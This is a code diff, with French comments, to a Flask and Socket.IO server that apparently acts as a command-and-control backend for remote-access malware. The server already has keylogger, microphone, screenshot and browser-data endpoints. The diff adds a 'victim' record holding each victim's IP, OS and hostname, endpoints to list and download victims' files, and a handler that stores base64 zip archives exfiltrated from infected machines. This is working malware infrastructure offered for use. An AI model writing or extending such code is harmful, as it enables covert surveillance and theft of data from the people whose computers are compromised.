@@ -44,6 +44,7 @@ screenshot_ns = api.namespace('api/v1/screenshot', description='Screenshot opera
 microphone_ns = api.namespace('api/v1/microphone', description='Microphone operations')
 browser_ns = api.namespace('api/v1/browser', description='Browser data operations')
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
+pc_victim_ns = api.namespace('api/v1/pc_victim', description='PC victim operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -80,6 +81,16 @@ keylogger_model = api.model('Keylogger', {
     'id': fields.Integer(required=True, description='ID du keylogger'),
     'file_path': fields.String(required=True, description='Chemin du fichier du keylogger'),
     'date_created': fields.String(required=True, description='Date de création du keylogger')
+})
+pc_victim_model = api.model('PCVictim', {
+    'id': fields.Integer(required=True, description='ID de la victime'),
+    'ip': fields.String(required=True, description='Adresse IP de la victime'),
+    'os': fields.String(required=False, description='Système d\'exploitation de la victime'),
+    'os_version': fields.String(required=False, description='Version du système d\'exploitation de la victime'),
+    'hostname': fields.String(required=False, description='Nom d\'hôte de la victime'),
+    'status': fields.String(required=True, description='Statut de la victime'),
+    'date_created': fields.String(required=True, description='Date de création de la victime'),
+    'date_updated': fields.String(required=True, description='Date de mise à jour de la victime')
 })
 
 client_params = api.parser()
@@ -305,6 +316,30 @@ class GetKeyloggerLog(Resource):
             return {'status': 'error', 'message': 'Fichier du keylogger non trouvé.'}, 404
 
 
+@pc_victim_ns.route('/client/<int:client_id>')
+class GetPCVictimsByClientId(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @pc_victim_ns.marshal_with(pc_victim_model, as_list=True)
+    def get(self, client_id):
+        pc_victims = Command.query.filter_by(client_id=client_id, type=CommandType.PC_VICTIM).all()
+        for pc_victim in pc_victims:
+            pc_victim.date_created = pc_victim.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return pc_victims, 200
+
+
+@pc_victim_ns.route('/file/<int:pc_victim_id>')
+class GetPCVictimFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, pc_victim_id):
+        pc_victim = Command.query.get(pc_victim_id)
+        if pc_victim and os.path.exists(pc_victim.file_path):
+            return send_file(pc_victim.file_path)
+        else:
+            return {'status': 'error', 'message': 'Fichier de la victime non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -415,6 +450,22 @@ def handle_keyboard(data):
             db.session.add(new_command)
             db.session.commit()
 
+
+@socketio.on('pc_victim_response')
+def handle_pc_victim(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        file_bytes = base64.b64decode(data.get('file'))
+        file_dir = f"pc_victims/{client.ip}"
+        os.makedirs(file_dir, exist_ok=True)
+        file_path = f"{file_dir}/pc_victim.zip"
+        with open(file_path, 'wb') as f:
+            f.write(file_bytes)
+        new_command = Command(type=CommandType.PC_VICTIM, client_id=client.id, file_path=file_path)
+        db.session.add(new_command)
+        db.session.commit()
+        app.logger.info(f"Fichier de la victime reçu de {client.ip} et enregistré sous {file_path}")
 
 @socketio.on('disconnect')
 def handle_disconnect():
